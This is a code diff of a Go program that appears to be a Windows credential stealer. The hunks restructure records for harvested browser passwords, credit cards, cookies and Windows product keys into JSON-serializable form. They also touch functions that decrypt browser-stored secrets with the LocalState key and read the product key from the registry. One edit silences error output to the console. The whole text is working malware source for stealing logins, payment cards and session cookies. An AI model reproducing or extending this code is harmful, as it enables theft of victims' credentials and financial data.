@@ -134,26 +134,26 @@ type PLATFORM struct {
 }
 
 type PASSWD struct {
-	url  string
-	user string
-	pass string
+	Url  string `json:"url"`
+	User string `json:"username"`
+	Pass string `json:"password"`
 }
 
 type CCARD struct {
-	Name       string
-	Number     string
-	Expiration string
+	Name       string `json:"name"`
+	Number     string `json:"number"`
+	Expiration string `json:"exp"`
 }
 
 type COOKIE struct {
-	Host  string
-	Name  string
-	Value string
+	Host  string `json:"url"`
+	Name  string `json:"name"`
+	Value string `json:"value"`
 }
 
-type ProductKey struct {
-	Value string
-	Type  string
+type PRODUCTKEY struct {
+	Value string `json:"value"`
+	Type  string `json:"type"`
 }
 
 func NewBlob(d []byte) *DATA_BLOB {
@@ -300,7 +300,7 @@ func DecryptBlob(BLOB string, LocalState string) string {
 		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
 		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
 		if err != nil {
-			fmt.Println(err)
+			//fmt.Println(err) Commented because it dumps a bunch of shit to console.
 		}
 		if string(plaintext) != "" {
 			output = string(plaintext)
@@ -364,9 +364,9 @@ func GetPasswords() []PASSWD {
 
 			if PASSWORD != "" {
 				output = append(output, PASSWD{
-					url:  URL,
-					user: USERNAME,
-					pass: PASSWORD,
+					Url:  URL,
+					User: USERNAME,
+					Pass: PASSWORD,
 				})
 			}
 		}
@@ -472,8 +472,8 @@ func GetCreditCards() []CCARD {
 	return output
 }
 
-func GetProductKey() *ProductKey {
-	output := new(ProductKey)
+func GetProductKey() *PRODUCTKEY {
+	output := new(PRODUCTKEY)
 
 	sir, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
 	if err != nil {
